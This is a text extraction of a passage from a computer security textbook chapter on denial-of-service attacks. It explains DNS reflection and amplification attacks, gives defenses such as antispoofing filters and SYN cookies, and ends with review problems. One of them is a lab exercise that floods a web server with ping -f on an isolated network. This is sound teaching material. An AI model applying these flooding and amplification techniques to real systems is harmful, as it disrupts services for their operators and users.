       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 264, 'page_label': '263'}, page_content='7.5 / REFLECTOR AND AMPLIFIER ATTACKS  263\\nservice. The\\xa0DNS server then sends a response to the victim of the attack, j.k.l.m, \\naddressed to port 7 . If the victim is offering the echo service, it may create a packet \\nthat echoes the received data back to the DNS server. This can cause a loop between \\nthe DNS server and the victim if the DNS server responds to the packets sent by the \\nvictim. Most reflector attacks can be prevented through network-based and host-\\nbased firewall rulesets that reject suspicious combinations of source and destination \\nports.\\nWhile very effective if possible, this type of attack is fairly easy to filter for \\nbecause the combinations of service ports used should never occur in normal network \\noperation.\\nWhen implementing any of these reflection attacks, the attacker could use just \\none system as the original source of packets. This suffices, particularly if a service is \\nused that generates larger response packets than those originally sent to the inter -\\nmediary. Alternatively, multiple systems might be used to generate higher volumes of \\ntraffic to be reflected and to further obscure the path back to the attacker. Typically \\na botnet would be used in this case.\\nAnother characteristic of reflection attacks is the lack of backscatter traffic. \\nIn both direct flooding attacks and SYN spoofing attacks, the use of spoofed source \\naddresses results in response packets being scattered across the Internet and thus \\ndetectable. This allows security researchers to estimate the volumes of such attacks. \\nIn reflection attacks, the spoofed source address directs all the packets at the desired \\ntarget and any responses to the intermediary. There is no generally visible side effect \\nof these attacks, making them much harder to quantify. Evidence of them is only \\navailable from either the targeted systems and their ISPs or the intermediary systems. \\nIn either case, specific instrumentation and monitoring would be needed to collect \\nthis evidence.\\nFundamental to the success of reflection attacks is the ability to create spoofed-\\nsource packets. If filters are in place that block spoofed-source packets, as described \\nin (RFC 2827), then these attacks are simply not possible. This is the most basic, \\nFigure 7.6 DNS Reflection Attack\\nIP: a.b.c.d\\nIP: a.b.c.d\\nIP: j.k.l.m\\nVictim\\nLoop\\npossible\\nDNS\\nserver\\nNormal\\nuser\\nAttacker\\nDNS\\nserver\\nIP: w.x.y.z\\nFrom: a.b.c.d:1792\\nTo: w.x.y.z.53\\nFrom: w.x.y.z.53\\nTo: a.b.c.d:1792\\nFrom: j.k.l.m:7\\nTo: w.x.y.z.53\\nFrom: w.x.y.z.53\\nTo: j.k.l.m:7\\nFrom: j.k.l.m:7\\nTo: w.x.y.z.53\\n1\\n1\\n2\\n2\\n3\\nIP: w.x.y.z\\nM07_STAL0611_04_GE_C07.indd   263 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 265, 'page_label': '264'}, page_content='264  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nfundamental defense against such attacks. This is not the case with either SYN \\nspoofing or flooding attacks (distributed or not). They can succeed using real source \\naddresses, with the consequences already noted.\\nAmplification Attacks\\nAmplification attacks  are a variant of reflector attacks and also involve sending a \\npacket with a spoofed source address for the target system to intermediaries. They \\ndiffer in generating multiple response packets for each original packet sent. This \\ncan be achieved by directing the original request to the broadcast address for some \\nnetwork. As a result, all hosts on that network can potentially respond to the request, \\ngenerating a flood of responses as shown in Figure 7.7 . It is only necessary to use \\na service handled by large numbers of hosts on the intermediate network. A\\xa0ping \\nflood using ICMP echo request packets was a common choice, since this service \\nis a fundamental component of TCP/IP implementations and was often allowed \\ninto networks. The well-known smurf DoS program used this mechanism and was \\nwidely popular for some time. Another possibility is to use a suitable UDP service, \\nsuch as the echo service. The fraggle program implemented this variant. Note that \\nTCP services cannot be used in this type of attack; because they are connection \\noriented, they cannot be directed at a broadcast address. Broadcasts are inherently \\nconnectionless.\\nThe best additional defense against this form of attack is to not allow directed \\nbroadcasts to be routed into a network from outside. Indeed, this is another long-\\nstanding security recommendation, unfortunately about as widely implemented as \\nthat for blocking spoofed source addresses. If these forms of filtering are in place, \\nthese attacks cannot succeed. Another defense is to limit network services such as \\necho and ping from being accessed from outside an organization. This restricts which \\n services could be used in these attacks, at a cost in ease of analyzing some legitimate \\nnetwork problems.\\nAttackers scan the Internet looking for well-connected networks that do allow \\ndirected broadcasts and that implement suitable services attackers can reflect off. \\nThese lists are traded and used to implement such attacks.\\nFigure 7.7 Amplification Attack\\nRef lector\\nintermediaries\\nTarget\\nAttacker\\nZombies\\nM07_STAL0611_04_GE_C07.indd   264 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 266, 'page_label': '265'}, page_content='7.6 / DEFENSES AGAINST DENIAL-OF-SERVICE ATTACKS  265\\nDNS Amplification Attacks\\nIn addition to the DNS reflection attack discussed previously, a further variant of an \\namplification attack uses packets directed at a legitimate DNS server as the intermedi-\\nary system. Attackers gain attack amplification by exploiting the behavior of the DNS \\nprotocol to convert a small request into a much larger response. This contrasts with the \\noriginal amplifier attacks, which use responses from multiple systems to a single request \\nto gain amplification. Using the classic DNS protocol, a 60-byte UDP request packet \\ncan easily result in a 512-byte UDP response, the maximum traditionally allowed. All \\nthat is needed is a name server with DNS records large enough for this to occur.\\nThese attacks have been seen for several years. More recently, the DNS  protocol \\nhas been extended to allow much larger responses of over 4000 bytes to support \\nextended DNS features such as IPv6, security, and others. By targeting servers that \\nsupport the extended DNS protocol, significantly greater amplification can be \\nachieved than with the classic DNS protocol.\\nIn this attack, a selection of suitable DNS servers with good network connec -\\ntions are chosen. The attacker creates a series of DNS requests containing the spoofed \\nsource address of the target system. These are directed at a number of the selected \\nname servers. The servers respond to these requests, sending the replies to the spoofed \\nsource, which appears to them to be the legitimate requesting system. The target is then \\nflooded with their responses. Because of the amplification achieved, the attacker need \\nonly generate a moderate flow of packets to cause a larger, amplified flow to flood and \\noverflow the link to the target system. Intermediate systems will also experience signifi-\\ncant loads. By using a number of high-capacity, well-connected systems, the attacker can \\nensure that intermediate systems are not overloaded, allowing the attack to proceed.\\nA further variant of this attack exploits recursive DNS name servers. This is a \\nbasic feature of the DNS protocol that permits a DNS name server to query a number \\nof other servers to resolve a query for its clients. The intention was that this feature \\nis used to support local clients only. However, many DNS systems support recursion \\nby default for any requests. They are known as open recursive DNS servers. Attack-\\ners may exploit such servers for a number of DNS-based attacks, including the DNS \\namplification DoS attack. In this variant, the attacker targets a number of open recur-\\nsive DNS servers. The name information being used for the attack need not reside \\non these servers, but can be sourced from anywhere on the Internet. The results are \\ndirected at the desired target using spoofed source addresses.\\nLike all the reflection-based attacks, the basic defense against these is to pre -\\nvent the use of spoofed source addresses. Appropriate configuration of DNS servers, \\nin particular limiting recursive responses to internal client systems only, as described \\nin RFC 5358, can restrict some variants of this attack.\\n 7.6 DEFENSES AGAINST DENIAL-OF-SERVICE ATTACKS\\nThere are a number of steps that can be taken both to limit the consequences of being \\nthe target of a DoS attack and to limit the chance of your systems being compromised \\nthen used to launch DoS attacks. It is important to recognize that these attacks cannot \\nbe prevented entirely. In particular, if an attacker can direct a large enough volume of \\nlegitimate traffic to your system, then there is a high chance this will overwhelm your \\nM07_STAL0611_04_GE_C07.indd   265 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 267, 'page_label': '266'}, page_content='266  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nsystem’s network connection, and thus limit legitimate traffic requests from other \\nusers. Indeed, this sometimes occurs by accident as a result of high publicity about a \\nspecific site. Classically, a posting to the well-known Slashdot news aggregation site \\noften results in overload of the referenced server system. Similarly, when popular \\nsporting events such as the Olympics or Soccer World Cup matches occur, sites report-\\ning on them experience very high traffic levels. This has led to the terms slashdotted, \\nflash crowd, or flash event  being used to describe such occurrences. There is very \\nlittle that can be done to prevent this type of either accidental or deliberate overload \\nwithout compromising network performance also. The provision of significant excess \\nnetwork bandwidth and replicated distributed servers is the usual response, particu-\\nlarly when the overload is anticipated. This is regularly done for popular sporting sites. \\nHowever, this response does have a significant implementation cost.\\nIn general, there are four lines of defense against DDoS attacks [PENG07 , \\nCHAN02]:\\n• Attack prevention and preemption (before the attack):  These mechanisms \\nenable the victim to endure attack attempts without denying service to legiti -\\nmate clients. Techniques include enforcing policies for resource consumption \\nand providing backup resources available on demand. In addition, prevention \\nmechanisms modify systems and protocols on the Internet to reduce the pos -\\nsibility of DDoS attacks.\\n• Attack detection and filtering (during the attack): These mechanisms attempt \\nto detect the attack as it begins and respond immediately. This minimizes the \\nimpact of the attack on the target. Detection involves looking for suspicious \\npatterns of behavior. Response involves filtering out packets likely to be part \\nof the attack.\\n• Attack source traceback and identification (during and after the attack): This is \\nan attempt to identify the source of the attack as a first step in preventing future \\nattacks. However, this method typically does not yield results fast enough, if at \\nall, to mitigate an ongoing attack.\\n• Attack reaction (after the attack): This is an attempt to eliminate or curtail the \\neffects of an attack.\\nWe discuss the first of these lines of defense in this section then consider the \\nremaining three in Section 7. 7.\\nA critical component of many DoS attacks is the use of spoofed source \\naddresses. These either obscure the originating system of direct and distributed DoS \\nattacks or are used to direct reflected or amplified traffic to the target system. Hence, \\none of the fundamental, and longest standing, recommendations for defense against \\nthese attacks is to limit the ability of systems to send packets with spoofed source \\naddresses. RFC 2827 , Network Ingress Filtering: Defeating Denial-of-service attacks \\nwhich employ IP Source Address Spoofing,8 directly makes this recommendation, as \\ndo SANS, CERT, and many other organizations concerned with network security.\\n8Note that while the title uses the term Ingress Filtering, the RFC actually describes Egress Filtering, with \\nthe behavior we discuss. True ingress filtering rejects outside packets using source addresses that belong \\nto the local network. This provides protection against only a small number of attacks.\\nM07_STAL0611_04_GE_C07.indd   266 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 268, 'page_label': '267'}, page_content='7.6 / DEFENSES AGAINST DENIAL-OF-SERVICE ATTACKS  267\\nThis filtering needs to be done as close to the source as possible, by routers \\nor gateways knowing the valid address ranges of incoming packets. Typically, this is \\nthe ISP providing the network connection for an organization or home user. An ISP \\nknows which addresses are allocated to all its customers and hence is best placed to \\nensure that valid source addresses are used in all packets from its customers. This \\ntype of filtering can be implemented using explicit access control rules in a router \\nto ensure that the source address on any customer packet is one allocated to the \\nISP . Alternatively, filters may be used to ensure that the path back to the claimed \\nsource address is the one being used by the current packet. For example, this may \\nbe done on Cisco routers using the “ip verify unicast reverse-path” command. This \\nlatter approach may not be possible for some ISPs that use a complex, redundant \\nrouting infrastructure. Implementing some form of such a filter ensures that the ISP’s \\ncustomers cannot be the source of spoofed packets. Regrettably, despite this being \\na well-known recommendation, many ISPs still do not perform this type of filtering. \\nIn particular, those with large numbers of broadband-connected home users are of \\nmajor concern. Such systems are often targeted for attack as they are often less well \\nsecured than corporate systems. Once compromised, they are then used as inter -\\nmediaries in other attacks, such as DoS attacks. By not implementing antispoofing \\nfilters, ISPs are clearly contributing to this problem. One argument often advanced \\nfor not doing so is the performance impact on their routers. While filtering does incur \\na small penalty, so does having to process volumes of attack traffic. Given the high \\nprevalence of DoS attacks, there is simply no justification for any ISP or organization \\nnot to implement such a basic security recommendation.\\nAny defenses against flooding attacks need to be located back in the Internet \\ncloud, not at a target organization’s boundary router, since this is usually located after \\nthe resource being attacked. The filters must be applied to traffic before it leaves the \\nISP’s network, or even at the point of entry to their network. While it is not possible, \\nin general, to identify packets with spoofed source addresses, the use of a reverse path \\nfilter can help identify some such packets where the path from the ISP to the spoofed \\naddress differs to that used by the packet to reach the ISP . In addition, attacks using \\nparticular packet types, such as ICMP floods or UDP floods to diagnostic services, can \\nbe throttled by imposing limits on the rate at which these packets will be accepted. \\nIn normal network operation, these should comprise a relatively small fraction of \\nthe overall volume of network traffic. Many routers, particularly the high-end rout-\\ners used by ISPs, have the ability to limit packet rates. Setting appropriate rate limits \\non these types of packets can help mitigate the effect of packet floods using them, \\nallowing other types of traffic to flow to the targeted organization even should an \\nattack occur.\\nIt is possible to specifically defend against the SYN spoofing attack by using \\na modified version of the TCP connection handling code. Instead of saving the con-\\nnection details on the server, critical information about the requested connection is \\ncryptographically encoded in a cookie that is sent as the server’s initial sequence num-\\nber. This is sent in the SYN-ACK packet from the server back to the client. When a \\nlegitimate client responds with an ACK packet containing the incremented sequence \\nnumber cookie, the server is then able to reconstruct the information about the con-\\nnection that it normally would have saved in the known TCP connections table. \\n Typically, this technique is only used when the table overflows. It has the advantage of \\nM07_STAL0611_04_GE_C07.indd   267 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 269, 'page_label': '268'}, page_content='268  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nnot consuming any memory resources on the server until the three-way TCP connec-\\ntion handshake is completed. The server then has greater confidence that the source \\naddress does indeed correspond with a real client that is interacting with the server.\\nThere are some disadvantages of this technique. It does take computation \\nresources on the server to calculate the cookie. It also blocks the use of certain TCP \\nextensions, such as large windows. The request for such an extension is normally \\nsaved by the server, along with other details of the requested connection. However, \\nthis connection information cannot be encoded in the cookie as there is not enough \\nroom to do so. Since the alternative is for the server to reject the connection entirely \\nas it has no resources left to manage the request, this is still an improvement in the \\nsystem’s ability to handle high connection-request loads. This approach was inde -\\npendently invented by a number of people. The best-known variant is SYN Cookies, \\nwhose principal originator is Daniel Bernstein. It is available in recent FreeBSD and \\nLinux systems, though it is not enabled by default. A variant of this technique is also \\nincluded in Windows 2000, XP , and later. This is used whenever their TCP connec-\\ntions table overflows.\\nAlternatively, the system’s TCP/IP network code can be modified to selectively \\ndrop an entry for an incomplete connection from the TCP connections table when \\nit overflows, allowing a new connection attempt to proceed. This is known as selec-\\ntive drop or random drop. On the assumption that the majority of the entries in an \\noverflowing table result from the attack, it is more likely that the dropped entry will \\ncorrespond to an attack packet. Hence, its removal will have no consequence. If not, \\nthen a legitimate connection attempt will fail, and will have to retry. However, this \\napproach does give new connection attempts a chance of succeeding rather than \\nbeing dropped immediately when the table overflows.\\nAnother defense against SYN spoofing attacks includes modifying parameters \\nused in a system’s TCP/IP network code. These include the size of the TCP connec-\\ntions table and the timeout period used to remove entries from this table when no \\nresponse is received. These can be combined with suitable rate limits on the organiza-\\ntion’s network link to manage the maximum allowable rate of connection requests. \\nNone of these changes can prevent these attacks, though they do make the attacker’s \\ntask harder.\\nThe best defense against broadcast amplification attacks is to block the use of \\nIP-directed broadcasts. This can be done either by the ISP or by any organization \\nwhose systems could be used as an intermediary. As we noted earlier in this chapter, \\nthis and antispoofing filters are long-standing security recommendations that all orga-\\nnizations should implement. More generally, limiting or blocking traffic to suspicious \\nservices, or combinations of source and destination ports, can restrict the types of \\nreflection attacks that can be used against an organization.\\nDefending against attacks on application resources generally requires modifica-\\ntion to the applications targeted, such as Web servers. Defenses may involve attempts \\nto identify legitimate, generally human initiated, interactions from automated DoS \\nattacks. These often take the form of a graphical puzzle, a captcha, which is easy for \\nmost humans to solve but difficult to automate. This approach is used by many of the \\nlarge portal sites such as Hotmail and Yahoo. Alternatively, applications may limit \\nthe rate of some types of interactions in order to continue to provide some form of \\nservice. Some of these alternatives are explored in [KAND05].\\nM07_STAL0611_04_GE_C07.indd   268 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 270, 'page_label': '269'}, page_content='7.7 / RESPONDING TO A DENIAL-OF-SERVICE ATTACK  269\\nBeyond these direct defenses against DoS attack mechanisms, overall good \\nsystem security practices should be maintained. The aim is to ensure that your sys -\\ntems are not compromised and used as zombie systems. Suitable configuration and \\nmonitoring of high performance, well-connected servers is also needed to help ensure \\nthat they do not contribute to the problem as potential intermediary servers.\\nLastly, if an organization is dependent on network services, it should consider \\nmirroring and replicating these servers over multiple sites with multiple network \\nconnections. This is good general practice for high-performance servers, and provides \\ngreater levels of reliability and fault tolerance in general and not just a response to \\nthese types of attack.\\n 7.7 RESPONDING TO A DENIAL-OF-SERVICE ATTACK\\nTo respond successfully to a DoS attack, a good incident response plan is needed. This \\nmust include details of how to contact technical personal for your Internet service \\nprovider(s). This contact must be possible using nonnetworked means, since when \\nunder attack your network connection may well not be usable. DoS attacks, particu-\\nlarly flooding attacks, can only be filtered upstream of your network connection. \\nThe plan should also contain details of how to respond to the attack. The division \\nof responsibilities between organizational personnel and the ISP will depend on the \\nresources available and technical capabilities of the organization.\\nWithin an organization, you should implement the standard antispoofing, \\ndirected broadcast, and rate limiting filters we discussed earlier in this chapter. Ide-\\nally, you should also have some form of automated network monitoring and intru -\\nsion detection system running so that personnel will be notified should abnormal \\ntraffic be detected. We will discuss such systems in Chapter 8. Research continues as \\nto how best identify abnormal traffic. It may be on the basis of changes in patterns \\nof flow information, source addresses, or other traffic characteristics, as [CARL06] \\ndiscusses. It is important that an organization knows its normal traffic patterns so it \\nhas a baseline with which to compare abnormal traffic flows. Without such systems \\nand knowledge, the earliest indication is likely to be a report from users inside or \\noutside the organization that its network connection has failed. Identifying the reason \\nfor this failure, whether attack, misconfiguration, or hardware or software failure, can \\ntake valuable additional time to identify.\\nWhen a DoS attack is detected, the first step is to identify the type of attack \\nand hence the best approach to defend against it. Typically, this involves capturing \\npackets flowing into the organization and analyzing them, looking for common attack \\npacket types. This may be done by organizational personnel using suitable network \\nanalysis tools. If the organization lacks the resources and skill to do this, it will need to \\nhave its ISP perform this capture and analysis. From this analysis, the type of attack is \\nidentified and suitable filters are designed to block the flow of attack packets. These \\nhave to be installed by the ISP on its routers. If the attack targets a bug on a system \\nor application, rather than high traffic volumes, then this must be identified and steps \\ntaken to correct it and prevent future attacks.\\nThe organization may also wish to ask its ISP to trace the flow of packets back \\nin an attempt to identify their source. However, if spoofed source addresses are used, \\nM07_STAL0611_04_GE_C07.indd   269 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 271, 'page_label': '270'}, page_content='270  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nthis can be difficult and time-consuming. Whether this is attempted may well depend \\non whether the organization intends to report the attack to the relevant law enforce-\\nment agencies. In such a case, additional evidence must be collected and actions \\ndocumented to support any subsequent legal action.\\nIn the case of an extended, concerted, flooding attack from a large number of \\ndistributed or reflected systems, it may not be possible to successfully filter enough \\nof the attack packets to restore network connectivity. In such cases, the organization \\nneeds a contingency strategy either to switch to alternate backup servers or to rapidly \\ncommission new servers at a new site with new addresses, in order to restore service. \\nWithout forward planning to achieve this, the consequence of such an attack will be \\nextended loss of network connectivity. If the organization depends on this connection \\nfor its function, the consequences on it may be significant.\\nFollowing the immediate response to this specific type of attack, the organiza-\\ntion’s incident response policy may specify further steps that are taken to respond \\nto contingencies like this. This should certainly include analyzing the attack and \\nresponse in order to gain benefit from the experience and to improve future han -\\ndling. Ideally, the organization’s security can be improved as a result. We will discuss \\nall these aspects of incident response further in Chapter 17.\\n 7.8 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\namplification attack\\navailability\\nbackscatter traffic botnet\\ndenial of service (DoS)\\ndirected broadcast\\ndistributed denial of service \\n(DDoS)\\nDNS amplification attack\\nflash crowd\\nflooding attack\\nInternet Control Message \\n Protocol (ICMP)\\nICMP flood\\npoison packet\\nrandom drop\\nreflection attack\\nslashdotted\\nsource address spoofing\\nSYN cookie\\nSYN flood\\nSYN spoofing\\nTCP\\nthree-way TCP handshake\\nUDP\\nUDP flood\\nzombie\\nReview Questions\\n 7.1 Define a denial-of-service (DoS) attack.\\n 7.2 State the difference between a SYN flooding attack and a SYN spoofing attack.\\n 7.3 What is the goal of an HTTP flood attack?\\n 7.4 What is a poison packet attack? Give two examples of such an attack.\\n 7.5 Why do many DoS attacks use packets with spoofed source addresses?\\n 7.6 What is “backscatter traffic?” Which types of DoS attacks can it provide information \\non? Which types of attacks does it not provide any information on?\\n 7.7 What is the dif ference between a DDoS attack and a classic DoS attack? Why are \\nDDoS attacks considered more potent than classic DoS attacks?\\n 7.8 What architecture does a DDoS attack typically use?\\nM07_STAL0611_04_GE_C07.indd   270 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 272, 'page_label': '271'}, page_content='7.8 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS  271\\n 7.9 Define an HTTP flood.\\n 7.10 Define a Slowloris attack.\\n 7.11 From an attacker’s perspective, what are the drawbacks of a classic ping flood attack?\\n 7.12 What defenses are possible against nonspoofed flooding attacks? Can such attacks be \\nentirely prevented?\\n 7.13 What is the purpose of SYN cookies?\\n 7.14 What defences are possible against a DNS amplification attack? Where must these be \\nimplemented? Which are unique to this form of attack?\\n 7.15 What defenses are possible to prevent an organization’s systems being used as inter -\\nmediaries in a broadcast amplification attack?\\n 7.16 To what do the terms slashdotted and flash crowd refer to? What is the relation between \\nthese instances of legitimate network overload and the consequences of a DoS attack?\\n 7.17 What steps should be taken when a DoS attack is detected?\\n 7.18 What measures are needed to trace the source of various types of packets used in \\na DoS attack? Are some types of packets easier to trace back to their source than \\nothers?\\nProblems\\n 7.1 In order to implement a classic DoS flood at tack, the attacker must generate a suffi-\\nciently large volume of packets to exceed the capacity of the link to the target organi-\\nzation. Consider an attack using ICMP echo request (ping) packets that are 100 bytes \\nin size (ignoring framing overhead). How many of these packets per second must the \\nattacker send to flood a target organization using a 8-Mbps link? How many per sec-\\nond if the packets are 1000 bytes in size? Or 1460 bytes?\\n 7.2 Using a TCP SYN spoofing attack, the attacker aims to flood the table of TCP con -\\nnection requests on a system so that it is unable to respond to legitimate connection \\nrequests. Consider a server system with a table for 256 connection requests. This sys-\\ntem will retry sending the SYN-ACK packet five times when it fails to receive an ACK \\npacket in response, at 30 second intervals, before purging the request from its table. \\nAssume no additional countermeasures are used against this attack and the attacker \\nhas filled this table with an initial flood of connection requests. At what rate must the \\nattacker continue to send TCP connection requests to this system in order to ensure \\nthat the table remains full? Assuming the TCP SYN packet is 40 bytes in size (ignoring \\nframing overhead), how much bandwidth does the attacker consume to continue this \\nattack?\\n 7.3 Consider a distributed variant of the attack we explore in Problem 7.1. Assume the \\nattacker has compromised a number of broadband-connected residential PCs to use as \\nzombie systems. Also assume each such system has an average uplink capacity of 256 kbps. \\nWhat is the maximum number of 100-byte ICMP echo request packets a single zombie \\nPC can send per second? If the packet size is 1000 bytes? Or 1500 bytes? How many such \\nzombie systems would the attacker need to flood a target organization using a 8-Mbps \\nlink? Given reports of botnets composed of many thousands of zombie systems, what can \\nyou conclude about their controller’s ability to launch DDoS attacks on multiple such \\norganizations simultaneously? Or on a major organization with multiple, much larger net-\\nwork links than we have considered in these problems?\\n 7.4 In order to implement a DNS amplification at tack, the attacker must trigger the cre-\\nation of a sufficiently large volume of DNS response packets from the intermediary \\nto exceed the capacity of the link to the target organization. Consider an attack where \\nthe DNS response packets are 100 bytes in size (ignoring framing overhead). How \\nmany of these packets per second must the attacker trigger to flood a target organiza-\\ntion using an 8-Mbps link? If packet size is 1000 bytes? Or 1500 bytes? If the DNS \\nM07_STAL0611_04_GE_C07.indd   271 10/11/17   2:54 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 273, 'page_label': '272'}, page_content='272  CHAPTER 7 / DENIAL-OF-SERVICE ATTACKS\\nrequest packet to the intermediary is 70 bytes in size, how much bandwidth does the \\nattacker consume out of the 8-Mbps link to send the necessary rate of DNS request \\npackets?\\n 7.5 It is discussed that an amplification attack, which is a variant of reflection attack, can \\nbe launched by using any type of a suitable UDP service, such as the echo service. \\nHowever, TCP services cannot be used in this attack. Why?\\n 7.6 Research how to implement the defenses for the applications that are targeted (e.g., \\nWeb server of your Organization) by the attacker.\\n 7.7 Assume a future where security countermeasures against DoS attacks are much more \\nwidely implemented than at present. In this future network, antispoofing and directed \\nbroadcast filters are widely deployed. In addition, the security of PCs and worksta -\\ntions is much greater, making the creation of botnets difficult. Do the administrators \\nof server systems still have to be concerned about, and take further countermeasures \\nagainst, DoS attacks? If so, what types of attacks can still occur, and what measures \\ncan be taken to reduce their impact?\\n 7.8 If you have access to a network lab with a dedicated,  isolated test network, explore \\nthe effect of high traffic volumes on its systems. Start any suitable Web server (e.g., \\nApache, IIS, TinyWeb) on one of the lab systems. Note the IP address of this system. \\nThen have several other systems query its server. Now, determine how to generate a \\nflood of 1500-byte ping packets by exploring the options to the ping command. The \\nflood option -f may be available if you have sufficient privilege. Otherwise determine \\nhow to send an unlimited number of packets with a 0-second timeout. Run this ping \\ncommand, directed at the Web server’s IP address, on several other attack systems. \\nSee if it has any effect on the responsiveness of the server. Start more systems ping -\\ning the server. Eventually its response will slow and then fail. Note since the attack \\nsources, query systems, and target are all on the same LAN, a very high rate of packets \\nis needed to cause problems. If your network lab has suitable equipment to do so, \\nexperiment with locating the attack and query systems on a different LAN to the tar-\\nget system, with a slower speed serial connection between them. In this case, far fewer \\nattack systems should be needed. You can also explore application level DoS attacks \\nusing SlowLoris and RUDY using the exercise presented in [DAMO12].\\nM07_STAL0611_04_GE_C07.indd   272 10/11/17   2:54 PM'),\n",
